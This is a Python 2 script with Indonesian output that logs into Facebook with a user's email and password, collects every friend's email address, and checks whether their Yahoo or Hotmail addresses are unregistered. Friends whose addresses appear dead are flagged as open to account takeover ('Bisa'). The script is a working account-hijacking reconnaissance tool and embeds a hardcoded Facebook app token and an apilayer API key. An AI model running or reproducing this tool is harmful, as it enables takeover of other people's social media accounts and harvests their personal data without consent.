import requests, json, os, re, sys, mechanize, urllib
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
os.system("clear")    
idt = raw_input(" Email facebook: ")
passw = raw_input(" Password facebook: ")
url = "https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + (idt) + "&locale=en_US&password=" + (passw) + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
data = urllib.urlopen(url)
op = json.load(data)
if 'access_token' in op: 
    token = (op["access_token"]) 
    print (" Login Berhasil")
else: 
    print ("Login Gagal!") 
    sys.exit()
get_friends = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
hasil = json.loads(get_friends.text)
print (" Berhasil Mendapatkan ID Teman...")
def defense(): 
    global o, h 
    o = [] 
    h = 0 
    print   70*"-" 
    print " "
    print 70*"-" 
    for i in hasil['data']: 
        h +=1 
        o.append(h) 
        x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token) 
        z = json.loads(x.text) 
        try: 
            kunci = re.compile(r'@.*') 
            cari = kunci.search(z['email']).group() 
            if 'yahoo.com' in cari: 
                br.open("https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com") 
                br._factory.is_html = True 
                br.select_form(nr=0) 
                br["username"] = z['email']
                j = br.submit().read() 
                Zen = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*') 
                try: 
                    cd = Zen.search(j).group() 
                except: 
                    vuln = 6*" " + "Tidak bisa" 
                    #Email Len 
                    lean =  (len(z['email'])) 
                    eml = lean * " " 
                    #Name Len 
                    lone =  (len(vuln)) 
                    namel = lone * " " 
                    print  z['email'] + " " + "|" + z['name'] + "|"  + vuln  
                    continue 
                if '"messages.ERROR_INVALID_USERNAME">' in cd: 
                    vuln = 8*" " + "Bisa" 
                else: 
                    vuln = 5*" " + "Tidak bisa" 
                #Email Len 
                lean = (len(z['email'])) 
                eml = lean * " " 
                #Name Len 
                #Author: Zen-Oh-Sama 
                lone = (len(vuln)) 
                namel = lone * " " 
                print  z['email'] + " "+ "|" + z['name'] + "|" +  vuln  
            elif 'hotmail' in cari: 
                url = ("http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=" + z['email'] + "&smtp=1&format=1") 
                cek = json.loads(requests.get(url).text) 
                if cek['smtp_check'] == 0: 
                    vuln = 8*" " + "Bisa" 
                else: 
                    vuln = 5*" " + "Tidak bisa" 
                lean = (len(z['email'])) 
                eml = lean * " " 
                #Name Len 
                #Author: Zen-Oh-Sama 
                lone = (len(vuln)) 
                namel = lone * " " 
                print   z['email'] + eml +  vuln  
            else: 
                pass 
        except KeyError: 
            pass
defense()